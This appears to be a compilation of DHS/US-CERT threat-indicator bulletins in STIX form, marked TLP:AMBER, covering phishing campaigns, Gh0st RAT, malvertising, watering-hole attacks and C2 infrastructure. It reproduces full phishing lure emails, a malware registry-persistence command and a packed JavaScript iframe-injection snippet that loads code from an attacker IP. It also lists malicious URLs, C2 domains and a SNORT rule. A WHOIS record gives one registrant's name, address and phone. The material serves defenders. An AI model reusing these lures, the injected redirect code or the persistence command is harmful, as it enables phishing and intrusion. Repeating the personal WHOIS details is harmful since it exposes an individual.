stix:STIX_Header.stix:Title: Phishing Email with Occupy and Economy Theme Includes Malware
stix:STIX_Header.stix:Description: On 9 October 2014, a phishing email was sent from anisewu.umac@gmail.com with the subject "OCCUPY AND ECONOMY". The email included the malicious attachment OCCUPY AND ECONOMY_PDF.Z (MD5: 83da223f31c51976a53d91e92b6bc186). The malware calls back to www.sslquery.myz.info:1099.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- Delivered-To: [REDACTED] Received: by 10.25.212.207 with SMTP id l198csp221189lfg; Thu, 9 Oct 2014 20:15:09 -0700 (PDT) Return-Path: <anisewu.umac@gmail.com> Received-SPF: pass (google.com: domain of anisewu.umac@gmail.com designates 10.112.166.66 as permitted sender) client-ip=10.112.166.66 Authentication-Results: mr.google.com; spf=pass (google.com: domain of anisewu.umac@gmail.com designates 10.112.166.66 as permitted sender) smtp.mail=anisewu.umac@gmail.com; dkim=pass header.i=@gmail.com X-Received: from mr.google.com ([10.112.166.66]) by 10.112.166.66 with SMTP id ze2mr849423lbb.68.1412910909147 (num_hops = 1); Thu, 09 Oct 2014 20:15:09 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=0ULWtZyeqtysOWopMdUgUlRkbFMBJ73SJK4N8zYtxRw=; b=G0TTH8Wpwqyt+k1RqBbA3naNNZtAJifQWxvmaXYfcXBYpGzxjXGebqZhSKYE068GRM mGi/sbhlEsO3r0jvroBewln8nYs6vwcXxFPIyH1W98KL37e0/96QxGpE0fMj+MaRYHmE a4fg7QsUnOs4lmmLXATflgVLvP66CCRbgmmJTUyBXlM+Dj01LwWztckW0h/kc6Fpac1q VijTvByf4sTxxEKGVGMODlD7gnPY9Y5Y1u/fKYwakndzeIoKNCFzNbNr78Vf01kx+z72 48d47b4SV/61kXhNV28eqSU72TACO7DOziD9uzb/x6UVwvsKpENEX4Bmitq0UzjVXUGe uGKA== MIME-Version: 1.0 X-Received: by 10.112.166.66 with SMTP id ze2mr1410110lbb.68.1412910909084; Thu, 09 Oct 2014 20:15:09 -0700 (PDT) Received: by 10.25.160.130 with HTTP; Thu, 9 Oct 2014 20:15:08 -0700 (PDT) Date: Fri, 10 Oct 2014 11:15:08 +0800 Message-ID: <CAOP-=Si-nUDxVqZJxv3TrzOQRLkrh=Zf+Cs1gq73j=shaWA_hg@mail.gmail.com> Subject: OCCUPY AND ECONOMY From: anise wu <anisewu.umac@gmail.com> To: fcodigitaldiplomacy@gmail.com Content-Type: multipart/mixed; boundary=001a11c34798d5fc8a050508f489 Bcc: [REDACTED] ---- END EMAIL HEADER ---- ---- BEGIN EMAIL BODY ---- Attachments: OCCUPY AND ECONOMY PDF.Z OC have short-term impacts for hk economy ,few long-term economic effects. Centre for European Policy Studies's latest report on OC AND ECONOMY HK.
password:ochk2014 ---- END EMAIL BODY ----
The sender anisewu.umac@gmail.com was previously used in multiple phishing campaigns described in the following bulletins:
IB-13-10556 IB-13-10747 IB-14-10161 IB-14-10202
At least one of the campaigns was reported as being associated with Team 338 activity.
This file is a password protected RAR requiring the password ?ochk2014?. It contains one file, OCCUPY AND ECONOMY_PDF.exe (MD5: 771dc378014ede4db8bd69e3a4738f11).

When this file is executed, it runs the REG.EXE add command to modify the system registry. It then renames and moves itself as WMService.exe under user's %appdata% directory:
"C:\WINDOWS\system32\cmd.exe" /c reg add hkcu\software\microsoft\windows\currentversion\run /v hotkey /t reg_sz /d "C:\Documents and Settings\[user]\Application Data\WMService.exe -st" /f & move "C:\DOCUME~1\[user]\LOCALS~1\Temp\OCCUPY-AND-ECONOMY_PDF.exe.exe" "C:\Documents and Settings\[user]\Application Data\WMService.exe"
This malware is persistent following system reboot. It runs with the "-st" parameter; a new process is created and then elevated. The malware uses API calls to wininet.dll and mswsock.dll for network communication.
The malware moves itself to C:\Documents and Settings\[user]\Application Data\WMService.exe
The following unique strings were found in the malware:
kjhasre78hqlw3s8auf hellp woefskad u34sdfa8342jrtqerjf8ausoiduoier COMSPEC u\software\microsoft\wind /c reg add hkc un /v hotkey /t reg_sz /d " ows\currentversion\r -st" /f & move " Open shell32.dll ShellExecuteEx APPDATA 4pnp.exe sMin -st s.bin urlmon.dll wininet.dll URLDownloadToFileA DeleteUrlCacheEntry 6aaa ppp+ iU~gS|eQzdOxbMv`Ku_It\Gr[EpYCoXAmV?kT>jR;iQ;gP8fN7eM5cL4cK3bJ2`H0
The malware opened a UDP listening port on the compromised system via port 1099. It then sent a DNS Request made for the domain www.sslquery.myz.info.

The malware WMService.exe (MD5: 771dc378014ede4db8bd69e3a4738f11) created a UDP listening port on port 1099 then sent a DNS request for: www.sslquery.myz.info
HTTP GET: IP/Domain: www.sslquery.myz.info Port: 443
GET .bin HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727) Connection: Keep-Alive

stix:STIX_Header.stix:Title: Real-Time Bidding Malvertising Activity
stix:STIX_Header.stix:Description:
On 05 December 2014 a U.S. government department reported observing a targeted campaign against hosts on a U.S. government department's networks. The actors employed "real-time bidding" (RTB) technology to obtain potential target information, and then subsequently redirected targets to exploit servers. This tactic, technique, and procedure (TTP) of using RTB technology for malicious intent is described as [micro-targeted] "malvertising" in open source InfoSec materials.
Between 14 and 20 October 2014, department hosts using over 35 different department IP addresses were redirected to exploitation servers using the RTB TTP, with hosts using at least 31 of those IP addresses successfully downloading unidentified Flash exploits.
The targets received an RTB-enabled POST redirect from one of two ad server domains, "delivery.first-impression.com" or "cdn1sitescout.edgesuite.net".
Once the first Flash file was downloaded, the host would request a second Flash file via a POST command from one of three exploit servers at IP addresses: 80.79.121.57, 192.161.180.235, or 198.55.119.100. This Flash file contained the Flash exploit. An example POST request URL used to obtain the flash file was: http://caselogics.eu/yag807912157/gate.php
If successful, the victim was directed to request and download a malware installation file from the same exploit server. An example GET request URL for the installer was: http://caselogics.eu/yag807912157/loxotrap.php
The following domains were all associated with the exploit servers: caselogics.eu, 80.79.121.57, Flash file request caselogictrue.eu, 80.79.121.57, used only when compromised host is calling down the malware installation code - successful exploit fancymancy.eu, 198.55.119.100, Flash file request fancyfellas.eu, 198.55.119.100, used only when compromised host is calling down the malware installation code - successful exploit lovertr.eu, 192.161.180.235, Flash file request tracksme.eu, 192.161.180.235, used only when compromised host is calling down the malware installation code - successful exploit
The malware installation code contains logic to attempt to contact a rotating list of domains which are likely used to host next-stage malware downloads, likely containing a TOR client or TOR client functionality to contact command and control (C2) servers in the TOR network: www.houselifesupport.com www.fdp-aue-schwarzenberg.de www.sportantiques.co.uk www.mcgownguild.com www.grkiskaforeningen.com www.meihuainfo.com www.felixwoman.com www.rock-times.com www.drk-wettringen.de www.mg-uterburg.ch artpartner.cz www.jes.or.at www.yemekyapmak.com www.footstepsphotography.co.uk www.projetorideal.com.br www.jimcole.be eportfolio.ccpullman.ca www.cup-neumann.de www.areaverda.com www.choosingcruising.co.uk

The original report indicates that the malware installation code calls out to each of the following rotating domains which are probably associated with next-stage malware downloads: www.houselifesupport.com www.fdp-aue-schwarzenberg.de www.sportantiques.co.uk www.mcgownguild.com www.grkiskaforeningen.com www.meihuainfo.com www.felixwoman.com www.rock-times.com www.drk-wettringen.de www.mg-uterburg.ch artpartner.cz www.jes.or.at www.yemekyapmak.com www.footstepsphotography.co.uk www.projetorideal.com.br www.jimcole.be eportfolio.ccpullman.ca www.cup-neumann.de www.areaverda.com www.choosingcruising.co.uk
According to open source, these domains have been used to download TOR clients. TOR is a free anonymizer service which encrypts traffic and obscures traffic routing. This service is frequently used by attackers to conceal malicious implant command and control activities.

stix:STIX_Header.stix:Title: Watering Hole Attacks Involving Forum Websites
stix:STIX_Header.stix:Description: On or around 16 September 2014, watering hole attacks involving forum websites compromised three U.S. Government agency hosts by exploiting Silverlight and Flash vulnerabilities. The systems were redirected to domains that all resolved to 64.202.116.152.

stix:Indicator.indicator:Description: The three systems each visited compromised websites, where they were redirected to other websites and then compromised. All three hosts were redirected to websites that resolved to IP address 64.202.116.152.

The first compromised host was redirected to this site while visiting the web forum http://forum.freeadvice.com/otherreal-estate-law-questions-11/multiple-owners-deed-can-one-force-sale-230896.html. The host was compromised at this site through exploitation of Silverlight vulnerabilities described in CVE-2013-0074 and CVE-2013-3896. The successful execution of the exploit code caused the victim to download an RC4-encrypted malware binary installation program.

The second compromised host was redirected to this site while visiting the web forum http://www.thebassbarn.com/forum/12-dry-dock/335063-not-even-dog-catcher.html. The host was compromised at this site by an unidentified Flash exploit. The successful execution of the exploit code caused the victim to download an RC4-encrypted malware binary installation program.

The third compromised host was redirected to this site while visiting the web forum http://forum.freeadvice.com/consumer-bankruptcy-2/post-petition-defamation-219048.html. The host was compromised at this site by an unidentified Flash exploit. The successful execution of the exploit code caused the victim to download an RC4-encrypted malware binary installation program.

stix:STIX_Header.stix:Title: Indicators of Compromise (IOCs) Identified in Newly Discovered Malware
stix:STIX_Header.stix:Description: On April 26, 2015, US-CERT was notified by a trusted third party of indicators of compromise (IOCs) identified in newly discovered malware.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description:
The MD5 hash changes for each individual deployment of the malware.
The discovered malware is capable of persistence, use of public storage mechanisms for exfiltration, and encrypted CNE communication. The encryption paired with the type of command and control (C2) infrastructure used, indicates a sophisticated, likely nation-state activity.

stix:STIX_Header.stix:Title: C2 Site Identified in Malware Incident Against a DIB Organization
stix:STIX_Header.stix:Description: On 4 September 2014, the command and control (C2) site lanxess-lab.com (106.187.45.162) was identified in a malware incident against a defense industrial base (DIB) organization.

stix:Indicator.indicator:Description:
(U//FOUO) The attackers leveraged the Secure Sockets Layer (SSL) version of TokenControl malware to compromise a DIB system. The TokenControl malware sent network traffic three times to the attacker-controlled C2 infrastructure at IP 106.187.45.162, which was associated with the domain lanxess-lab.com.
(U//FOUO) The following network traffic was observed:
Destination IP: 106.187.45.162 Destination Port: 443 Time: 4 September 1806Z
Destination IP: 106.187.45.162 Destination Port: 443 Time: 4 September 1807Z
Destination IP: 106.187.45.162 Destination Port: 443 Time: 4 September 1810Z
(U//FOUO) The following SNORT signature can be used to detect this traffic:
alert tcp any 443 -> any any (msg:"TokenControl SSL Implant"; content:"|00 a8 b7 14 44 09 c0 80 fb 0a c5 0b b8 03 ed|"; sid:1; rev:1;)
(U) According to third party reports, the domain name lanxess-lab.com (103.24.0.142) spoofs a materials and chemicals company based in Germany. The campaign involved a watering hole attack against the chemical sector on 26 August 2014. This domain was used as a C2 site.

stix:STIX_Header.stix:Title: Pleasantly Surprised Themed Phishing Email
stix:STIX_Header.stix:Description: On 08 April 2015, a phishing email was sent with the subject "Pleasantly surprised". The sender email address was reported as a compromised private email address. The email included the malicious attachment Pleasantly surprised.zip (MD5:76F5DC448AA1D63EC98D17C6DFEA853D), which contained the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com.

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER ---
Received: from resomta-ch2-02v.sys.comcast.net ([69.252.207.98]) .by resqmta-ch2-07v.sys.comcast.net with comcast .id Cbas1q00127uzMh01basmV; Mon, 06 Apr 2015 11:34:52 +0000 Received: from resmail-ch2-419v.sys.comcast.net ([162.150.49.198]) .by resomta-ch2-02v.sys.comcast.net with comcast .id Cbar1q0014Ga9ca01barhE; Mon, 06 Apr 2015 11:34:52 +0000 Date: Mon, 6 Apr 2015 11:34:50 +0000 (UTC) From: [REDACTED] To: [REDACTED] Message-ID: <742594056.15805669.1428320090733.JavaMail.zimbra@comcast.net> In-Reply-To: <14480398.15805585.1428320076905.JavaMail.zimbra@comcast.net> Subject: Pleasantly surprised MIME-Version: 1.0 Content-Type: multipart/mixed; .boundary="----=_Part_15805665_2043626427.1428320090718" X-Originating-IP: [::ffff:174.139.57.178] X-Mailer: Zimbra 8.0.7_GA_6031 (ZimbraWebClient - FF36 (Win)/8.0.7_GA_6031) Thread-Topic: Pleasantly surprised Thread-Index: hzBYnkUbb2Pqb0KNPn0PPaAfveK1Vg== DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=comcast.net; .s=q20140121; t=1428320092; .bh=7HgKqh/6sawN+CSB6VaL8Z3E+FnBlIkRU80gEPprKdE=; .h=Received:Received:Date:From:To:Message-ID:Subject:MIME-Version: . Content-Type; .b=CcQlr2wviFLmGdhRmM/wUHJwkRxWEDpAnZUtZ6mb9tKoVrhikS5NaM2adE6zVT5TE . 6yE8ZusrFr6IBcndlgBKJaVXmjTzij/l+sgXu7lSv/NDbnV18baxqmPsj8extPRIlJ . p8wWlTrWUXT8vuT8VbZ4STdzwOeyKswWHiTe8BpvJQu5Pfc4yf2URPRbhlt8lTmQx2 . Yz+d2CAjhMUOoOLDpucr6DJWrwJg0AB/1IJz/PnE7ffouid+MxKF63oAPZZLgCHALy . 3Qmsk9IcmFWqNtGrl90Fa8ZkT2xl6H6C2chBrlxXD26KkaBt3n2pcQR9h7rw2K66th . JxwxerGq0Gn1A== --- END EMAIL HEADER ---
--- BEGIN EMAIL BODY --- From: [REDACTED] To: [REDACTED] Subject: Pleasantly surprised Date: Mon, 6 Apr 2015 11:34:50 +0000 (UTC) Attachment: "Pleasantly surprised.zip"
--- END EMAIL BODY ---
This is a Zip archive file containing the file Pleasantly surprised.Exe (MD5 9F139181DF7FBCEFC6A53DBF5D274087).

This Gh0st RAT is an executable file that displays a pixelated play button icon. When the file is executed from the user's Desktop, the RAT moves itself to the Windows Temp directory and renames itself to WinApp.exe. For persistence, the RAT creates the following Microsoft Windows Shortcut C:\WINDOWS\Temp\WinRunApp.lnk and creates a pending file rename operation, for when the user logs out. This operation renames WinRunApp.lnk to WinUpdate.lnk in the All Users Startup folder. The RAT then initiates network traffic, which terminates upon the user logging out. The next time any User logs into the System, the WinUpdate.lnk Shortcut in the All Users Startup folder will execute the Gh0st RAT located at C:\WINDOWS\Temp\WinApp.exe.
The following changes were made to the system: File added: C:\WINDOWS\Temp\WinApp.exe
This file is a shortcut created from the RAT that points to C:\WINDOWS\Temp\WinApp.exe)

This is a Microsoft Windows shortcut, when selected it executes the file WinApp.exe (MD5 9F139181DF7FBCEFC6A53DBF5D274087) located in the Windows Temp directory.
The file hash value will differ depending on the system and the user under which the file was created. This is because the embedded details in the file will vary based on the file path and other variable information.
The file WinUpdate.lnk (MD5 363E5FD93087992BB332AA453F26976F) is renamed to WinRunApp.lnk (MD5 363E5FD93087992BB332AA453F26976F) that points to WinApp.exe (MD5 9F139181DF7FBCEFC6A53DBF5D274087).
This file attempts a DNS Request for the domain www.meitanjiaoyiwang.com then attempts to connect to the domain over port 500.
The file Pleasantly surprised.exe (MD5 9F139181DF7FBCEFC6A53DBF5D274087) performs a DNS request to command and control (C2) www.meitanjiaoyiwang.com using port 500.

stix:STIX_Header.stix:Title: Phishing Email with Fax Theme Sent to Energy Sector Organization
stix:STIX_Header.stix:Description: On 19 September 2014, a phishing email was sent from secure@docs-mvm.com with the subject "Fax" to 139 users of an energy sector organization. The email contained a malicious link to http://al-katech.com/acztobqupi/cfhjhbmbzy.html.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADER ---- HLO docs-mvm.com MAIL FROM: RCPT TO:[REDACTED] DATA Received: from docs-mvm.com (localhost.localdomain [127.0.0.1]) by docs-mvm.com (Postfix) with ESMTP id 5596FDFC07 for [REDACTED]; Fri, 19 Sep 2014 03:03:08 +0200 (CEST) X-DKIM: OpenDKIM Filter v2.6.8 docs-mvm.com 5596FDFC07 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=docs-mvm.com; s=mx; t=1411088588; bh=OEA1qOaHTiPI4Rh6kIzYKIfgjSAg38cvoYKzgFTHadE=; h=Date:From:To:Subject:From; b=IU1zSsWq4M4K/FtNgwiteqgx1SXESz3Z2PYZkXgg4y3HUFc4e+uKWw3vosTGcJZQm vMuoQeJLkaZCWmhbvmkTM/xm801dHDnjyKdZbquiywssihmvI6iESn+Di/o5Ig0JoV o3zCkC/JK1aUJ00vSRQqlYjm0zWIc0yJtRa4N3xg= MIME-Version: 1.0 Content-Type: multipart/alternative; boundary="=_148192376492" Date: Fri, 19 Sep 2014 03:03:07 +0200 From: secure@docs-mvm.com To: [REDACTED]; Subject: Fax Disposition-Notification-To: secure@docs-mvm.com Message-ID: X-Sender: secure@docs-mvm.com User-Agent: Roundcube Webmail/1.0.1 --=_148192376492 Content-Transfer-Encoding: 7bit Content-Type: text/plain ---- END EMAIL HEADER ---- ---- BEGIN EMAIL BODY ---- You have received a new fax. This fax was received by Fax Server. The fax has been downloaded to dropbox service (Google Inc). To view your fax message, please download from the link below. It's operated by Dropbox and safety. http://al-katech.com/acztobqupi/cfhjhbmbzy.html [1] http://al-katech.com/acztobqupi/cfhjhbmbzy.html --=_148192376492 Content-Transfer-Encoding: quoted-printable Content-Type: text/html; charset=UTF-8

You have received a new fax. This fax was received by Fax Server.
The fax has been downloaded to dropbox service (Google Inc).

To view your fax message, please download from the link below. It's operated by Dropbox and safety.

http://al-katech.com/acztobqupi/cfhjhbmbzy.html

Received Fax Details
---------------------------------------------------------------- ----------------------
Received on: 16/09/2014 08:14 AM
Number of Pages: 1
From (ID): 503-879-14819
Duration of Fax: 0:00:29
Transfer Speed: 4400

Received Status: Success
Number of Errors: 0
Port Received: NP_104
------------------------ ------------------------------------------------------------

This e-mail has been sent from an automated system.
PLEASE DO NOT REP. LY.

The information contained in this message may be privileged, confidential and protected from disclosure. If the reader of this message is not the intended recipient, or an employee or agent responsible for delivering this message to the intended recipient, you are hereby notified that any dissemination, distribution or copying of this communication is strictly prohibited. If you have received this communication in error, please notify your representative immediately and delete this message from your computer. Thank you.
--=_148192376492-- ---- END EMAIL BODY ---- The report stated this email was sent to 139 high-value individuals within the IT department of an energy sector organization. Those users included current and former employees. Some of the email address formats were correct, while others were guessed.

The malicious link to http://al-katech.com/acztobqupi/cfhjhbmbzy.html was the same one used for the reporting organization and a peer organization. The URL directory and .html page appeared to be auto-generated.
As of 30 October 2013, the domain al-katech.com resolved to IP 193.37.145.27.

stix:STIX_Header.stix:Title: Malicious Domains Use US Aerospace Organization Names
stix:STIX_Header.stix:Description: On 17 October 2014, we received reports of the domains northropgrumman.net and teledyne-jobs.com as malicious sites associated with attackers interested in exploiting US aerospace organizations.

stix:Indicator.indicator:Description: A third party associated this domain with attackers who are likely interested in exploiting US aerospace organizations.
A third party associated this domain with attackers who are likely interested in exploiting US aerospace organizations.

stix:STIX_Header.stix:Title: Phishing Email Delivers Gh0stRAT
stix:STIX_Header.stix:Description: On 27 October 2014 an organization received an HTML email containing disguised links pointing to a download of Gh0stRAT. If successfully installed the Gh0stRAT attempts to contact a command and control server (C2) via HTTP at IP address 223.25.233.244 (TCP port 80).

stix:Indicator.indicator:Description:
--- BEGIN EMAIL HEADER --- Return-Path: Subject: IFES X-SENDER-IP: 103.19.27.19 X-SENDER-REPUTATION: -0.1 Received: from pizza19.virtualhosting.hk (HELO pizza.virtualhosting.hk) ([103.19.27.19]) ; 27 Oct 2014 00:25:03 +0000 Received: from pizza-ms3.virtualhosting.hk (localhost [127.0.0.1]) by pizza.virtualhosting.hk (Postfix) with ESMTP id 4AB8960079B ; Mon, 27 Oct 2014 08:24:57 +0800 (HKT) Received: from webmail5.webhosthk.com (webmail5.webhosthk.com [203.135.128.145]) by pizza-ms3.virtualhosting.hk (Postfix) with ESMTPS id 434C160075F ; Mon, 27 Oct 2014 08:24:57 +0800 (HKT) Received: from gmail.com ([64.78.174.16]) by webmail5.webhosthk.com (Merak 7.6.4) with ASMTP id LSA74716 ; Mon, 27 Oct 2014 08:24:54 +0800 Message-ID: <20141027082448286822@gmail.com> Date: Mon, 27 Oct 2014 08:24:48 +0800 From: [REDACTED] X-mailer: xzfs7v 10.40.1836 Mime-Version: 1.0 Content-Type: multipart/alternative; boundary="_5JALg1qSC8gGoMkkJ16PCtbzk" X-Virus-Scanned: clamav-milter 0.98.3 at pizza-ms3.virtualhosting.hk X-Virus-Status: Clean X-Spam-Status: No, hits=-1.0 required=13.1 tests=BAYES_00, DKIM_ADSP_CUSTOM_MED, FREEMAIL_FROM, HTML_MESSAGE, NML_ADSP_CUSTOM_MED, UNPARSEABLE_RELAY version=3.3.1 X-Spam-Checker-Version: UDomainMailGuard 3.3.1 (2010-03-16) --- END EMAIL HEADER --- --- BEGIN EMAIL BODY --- Dear all, Thanks for your patience! As promised,please receive our P&P items as attached. Download attached: hxxp://www.ifesworld.org/report/ifes[.]zip P/W:ifes IFES International Service Centre [REDACTED SIGNATURE BLOCK] --- END EMAIL BODY ---

Dear all,
Thanks for your patience! As promised,please receive our P&P items as attached.
Download attached:http://www.ifesworld.org/report/ifes.zip
P/W:ifes

IFES International Service Centre
[REDACTED SIGNATURE BLOCK]
The email contained a disguised link that downloads a malicious file. --Begin Code Snippet-- http://www.ifesworld.org/report/ifes.zip --End Code Snippet--
This zip file contains IFES.exe (MD5 CC9962D18077FABB93ADF2887005C928)
IFES.exe (MD5 CC9962D18077FABB93ADF2887005C928) installs a copy of Gh0stRAT.

If successfully installed the Gh0stRAT attempts to contact a command and control server (c2) via HTTP at IP address 223.25.233.244 TCP port 80.
Sample Gh0st Beacon:
HTTP\1.1 Sycmentec....<...x.K...0........X.....H....e&.*.$&g+.30(.mepW`d........7..V...+T............ ....9..;.V. ..e.`\....G...@....@. ..6.... .l.W..]scKS......X.....NF0..../w.,K../).`...C$.

stix:STIX_Header.stix:Title: Watering Hole Activity on Aircraft Battery Website
stix:STIX_Header.stix:Description: On 24 October 2014, watering hole activity was reported on an aircraft battery manufacturing company's website. Malicious code was reported as being in the bottom of /scripts/minicart.js function which is referenced by many of the pages.

stix:Indicator.indicator:Description:
As of 24 October 2014, the malicious JS code pointed to 178.79.186.55/jquery.php and is returning an HTTP 404 error.
The following is a sample of the embedded malicious redirect code:
----- Begin Code Snippet -----
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6.7("<1 8=\\"5://2.3.4.c/d/e.9\\" a=0 b=0></1>");',15,15,'|iframe|178|79|186|http|document|write|src|php|width|height|55|js|Jquery'.split('|'),0,{}))
----- End Code Snippet -----
As of 30 September 2014 178.79.186.55 resolved to mxn3.nwave.in (A record).
According to a WHOIS search on http://whois.domaintools.com:
The domain is registered, along with 40 other domains, to the email address Kalyan.Manyamis@gmail.com.
ASN AS15830 TELECITY-LON TELECITYGROUP INTERNATIONAL LIMITED,GB (registered Oct 20, 2000)
The IP is hosted by a dedicated server of the VPN hosting service Linode Llc, London,UK.
Domain ID:D6762396-AFIN Domain Name:NWAVE.IN Created On:19-Sep-2012 11:54:17 UTC Last Updated On:29-Sep-2014 10:41:47 UTC Expiration Date:19-Sep-2015 11:54:17 UTC Sponsoring Registrar:Wild West Domains, LLC (R102-AFIN) Status:CLIENT DELETE PROHIBITED Status:CLIENT RENEW PROHIBITED Status:CLIENT TRANSFER PROHIBITED Status:CLIENT UPDATE PROHIBITED Status:AUTORENEWPERIOD Registrant ID:CR124286930 Registrant Name:Kalyan Manyam Registrant Organization: Registrant Street1:C 1903, Ramky Towers Registrant Street2:Gachibowli Registrant Street3: Registrant City:Hyderabad Registrant State/Province:Andhra Pradesh Registrant Postal Code:500032 Registrant Country:IN Registrant Phone:+91.9866620282 Registrant Phone Ext.: Registrant FAX: Registrant FAX Ext.: Registrant Email: Admin ID:CR124286932 Admin Name:Kalyan Manyam Admin Organization: Admin Street1:C 1903, Ramky Towers Admin Street2:Gachibowli Admin Street3: Admin City:Hyderabad Admin State/Province:Andhra Pradesh Admin Postal Code:500032 Admin Country:IN Admin Phone:+91.9866620282 Admin Phone Ext.: Admin FAX: Admin FAX Ext.: Admin Email: Tech ID:CR124286931 Tech Name:Kalyan Manyam Tech Organization: Tech Street1:C 1903, Ramky Towers Tech Street2:Gachibowli Tech Street3: Tech City:Hyderabad Tech State/Province:Andhra Pradesh Tech Postal Code:500032 Tech Country:IN Tech Phone:+91.9866620282 Tech Phone Ext.: Tech FAX: Tech FAX Ext.: Tech Email: Name Server:NS10.DNSMADEEASY.COM Name Server:NS11.DNSMADEEASY.COM Name Server:NS12.DNSMADEEASY.COM Name Server:NS13.DNSMADEEASY.COM Name Server:NS14.DNSMADEEASY.COM Name Server:NS15.DNSMADEEASY.COM Name Server: Name Server: Name Server: Name Server: Name Server: Name Server: Name Server: DNSSEC:Unsigned

stix:STIX_Header.stix:Title: Spear-Phishing Email Using "USAA" Theme Containing Malicious Attachment
stix:STIX_Header.stix:Description: On April 27, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "USAA" themed emails containing a malicious attachment.

stix:STIX_Header.stix:Title: Pleasantly Surprised Themed Phishing Email has Gh0st RAT Attachment
stix:STIX_Header.stix:Description: On 25 December 2014, emails with the subject "Pleasantly surprised" were sent from multiple Internet service provider (ISP) email addresses to recipients at a U.S. Government Department. The emails contained the malicious attachment Pleasantly surprised.zip, which contained a variant of the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.meitanjiaoyiwang.com on port 703. Multiple campaigns with a similar theme and indicators were previously identified, most recently in IB-14-10663.

stix:Indicator.indicator:Description: --- BEGIN EMAIL HEADER --- EHLO elasmtp-spurfowl.atl.sa.earthlink.net MAIL FROM:[REDACTED] SIZE=487376 RCPT [REDACTED] DATA DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws; s=dk20050327; d=earthlink.net; b=tzzzYU+kWz8Zk3lRFBQ5ZL9StNkKnSuKxY0uqpOK3OBZL8Y/xYvrqJtUfGuOBbI9; h=Message-ID:Date:From:Reply-To:To:Subject:Mime-Version:Content-Type:X-Mailer:X-ELNK-Trace:X-Originating-IP; Received: from [209.86.224.25] (helo=mswamui-backed.atl.sa.earthlink.net) by elasmtp-spurfowl.atl.sa.earthlink.net with esmtpa (Exim 4.67) (envelope-from [REDACTED] id 1Y32Vm-0008UY-2p; Mon, 22 Dec 2014 07:54:58 -0500 Received: from 174.139.86.74 by webmail.earthlink.net with HTTP; Mon, 22 Dec 2014 07:54:57 -0500 Message-ID: <31314755.1419252897908.JavaMail.root@mswamui-backed.atl.sa.earthlink.net> Date: Mon, 22 Dec 2014 20:54:57 +0800 (GMT+08:00) From:[REDACTED] Reply-To: [REDACTED] To: [REDACTED] Subject: Pleasantly surprised Mime-Version: 1.0 Content-Type: multipart/mixed; boundary="----=_Part_186_18025865.1419252897904" X-Mailer: EarthLink Zoo Mail 1.0 X-ELNK-Trace: 57e69e565eeeadd8d11ec6b3a467e3e2239a348a220c2609c9864970ada10230d8e056575664966ea8 438e0f32a48e08350badd9bab72f9c350badd9bab72f9c X-Originating-IP: 209.86.224.25 Attachments: Pleasantly surprised.zip (351073 bytes) --- END EMAIL HEADER ---
The headers of this email are not available. The body of the message was empty.
The headers of this email are not available. The body of the message was empty.
The headers of this email are not available. The body of the message was empty.
The headers of this email are not available. The body of the message was empty.
The headers of this email are not available. The body of the message was empty.
The headers of this email are not available. The body of the message was empty.
This is a zip archive file containing "Pleasantly Surprised.exe".

This is a Gh0st RAT variant. Upon execution, "Pleasantly Surprised.exe" launches in the process tree, initializing the standard Windows process RunDLL32.exe, which causes the following command to run: "RunDLL32.exe C;\Recycle09102014\GameUpdate.log, LoaderEntry".
The original executable file is deleted from the Desktop, and all processes are closed except "RunDLL32.exe". The following files are added: C:\WINDOWS\system32\ky1log.dat C:\Recycle09102014\GameUpdate.log
The following file is deleted: C:\Documents and Setting\User\Desktop\Pleasantly Surprised.exe

This is a Gh0st RAT implant DLL file loaded with the RunDLL32.exe, and the entry point of "LoaderEntry" @ 0100066A7. This file writes to "ky1log.dat". The network activity observed was as follows: IP/Domain: www.meitanjiaoyiwang.com Port: 702 Protocol: HTTP
The fileGameUpdate.log (MD5 43A9B8015D89E707695B5B381F694F51) attempts to connect to this Command and Control (C2) using HTTP through port 702.

stix:STIX_Header.stix:Title: Phishing Email with a Wire Transfer Theme and Bank Account Information
stix:STIX_Header.stix:Description: On 01 December 2014, a phishing email was sent from rfitzgerald@semgrroupcorp.com with the subject "Wire Transfer". In the domain semgrroupcorp.com, note the double "r", was intended to appear from an energy sector entity. The email included the .pdf file McGUIRE WIRING INSTRUCTION. It included directions to perform a wire transfer to an individual's bank account.

stix:STIX_Header.stix:Title: Afghan Military Themed Phishing Emails
stix:STIX_Header.stix:Description: On 04 November 2014, a U.S. government department observed phishing emails with a From address asif.gulzad@mod.gov.af, the subject "20141104", and a blank email body. The emails contained an attachment "Revised action plan.rar". The attachment was corrupted; therefore malware analysis could not be performed.

stix:STIX_Header.stix:Title: Hebrew Language Phishing Email Contains Poison Ivy RAT
